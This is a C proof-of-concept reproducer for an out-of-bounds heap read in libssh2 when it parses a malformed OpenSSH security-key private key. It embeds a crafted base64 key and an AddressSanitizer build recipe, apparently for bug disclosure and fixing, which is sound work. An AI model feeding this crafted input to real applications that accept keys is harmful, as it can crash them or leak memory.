/* Reproducer: out-of-bounds read while parsing a malformed OpenSSH
 * security-key private key.
 *
 * Feed a crafted, unencrypted ("none" cipher) openssh-key-v1 private key to
 * libssh2_userauth_publickey_sk(). The key type string inside the decrypted
 * private-key section is shorter than the "sk-ssh-ed25519@openssh.com" name
 * it is compared against and sits near the end of the buffer, so the
 * comparison reads past the end of the heap allocation. The key is parsed
 * before any network I/O, so no server is needed.
 *
 * Build (from the repository root, against an AddressSanitizer build of the
 * library in build/):
 *
 *   cc -fsanitize=address -g -O1 -Iinclude -Ibuild/src \
 *      pocs/sk_keytype_oob.c build/src/libssh2.a -lssl -lcrypto \
 *      -o sk_keytype_oob && ./sk_keytype_oob
 */
#include <libssh2.h>
#include <stdio.h>
#include <string.h>

/* base64 of the crafted openssh-key-v1 blob:
 *   "openssh-key-v1\0" auth magic
 *   string ciphername = "none"
 *   string kdfname    = "none"
 *   string kdf        = ""
 *   uint32 number of keys = 1
 *   string embedded public key (padding, skipped by the parser)
 *   string private key section:
 *     uint32 check 1 = uint32 check 2 = 0xdeadbeef
 *     string key type = "sk-ssh-ed25519"
 *     one trailing NUL byte, then end of section
 */
static const char key_b64[] =
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAACBERERER"
    "ERERAAAAG96tvu/erb7vAAAADnNrLXNzaC1lZDI1NTE5AA==";

static int sign_cb(LIBSSH2_SESSION *session, LIBSSH2_SK_SIG_INFO *sig_info,
                   const unsigned char *data, size_t data_len,
                   int algorithm, uint8_t flags,
                   const char *application,
                   const unsigned char *key_handle, size_t key_handle_len,
                   void **abstract)
{
    (void)session;
    (void)sig_info;
    (void)data;
    (void)data_len;
    (void)algorithm;
    (void)flags;
    (void)application;
    (void)key_handle;
    (void)key_handle_len;
    (void)abstract;
    return 0;
}

int main(void)
{
    LIBSSH2_SESSION *session;
    char pem[4096];
    size_t pem_len;
    int rc;

    if(libssh2_init(0) != 0) {
        puts("libssh2_init failed");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        puts("libssh2_session_init failed");
        return 1;
    }

    pem_len = (size_t)snprintf(pem, sizeof(pem),
                               "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                               "%s\n"
                               "-----END OPENSSH PRIVATE KEY-----\n",
                               key_b64);

    rc = libssh2_userauth_publickey_sk(session, "user", 4,
                                       NULL, 0,
                                       pem, pem_len, NULL,
                                       sign_cb, NULL);
    printf("libssh2_userauth_publickey_sk returned %d\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
